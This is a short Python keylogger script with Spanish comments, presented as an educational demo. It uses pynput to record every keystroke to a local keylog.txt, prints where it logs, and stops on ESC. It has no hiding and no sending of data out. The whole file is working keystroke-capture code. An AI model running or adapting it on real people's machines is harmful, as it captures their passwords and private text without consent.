import os
try:
    from pynput.keyboard import Key, Listener
except ImportError:
    print("Error: La librería 'pynput' no está instalada.")
    print("Por favor, instálala con: pip install pynput")
    exit()

# Configuración del archivo de log
log_file = "keylog.txt"

def on_press(key):
    """
    Función que se ejecuta cada vez que se presiona una tecla.
    """
    try:
        # Intentamos obtener el carácter de la tecla
        k = str(key).replace("'", "")
        
        # Formateo de teclas especiales para legibilidad
        if k == "Key.space":
            k = " "
        elif k == "Key.enter":
            k = "\n"
        elif k == "Key.backspace":
            k = "[BACKSPACE]"
        elif k == "Key.shift" or k == "Key.shift_r":
            k = ""
        elif "Key" in k:
            k = f"[{k.split('.')[1].upper()}]"

        # Escribimos en el archivo
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(k)
            
    except Exception as e:
        print(f"Error al registrar tecla: {e}")

def on_release(key):
    """
    Función que se ejecuta al soltar una tecla.
    Si se presiona ESC, se detiene el listener.
    """
    if key == Key.esc:
        print("\nDeteniendo el keylogger...")
        return False

if __name__ == "__main__":
    print("-" * 50)
    print("KEYLOGGER DEMO (EDUCATIVO)")
    print("Registrando en: " + os.path.abspath(log_file))
    print("Presiona ESC para detener.")
    print("-" * 50)

    # Iniciamos el listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
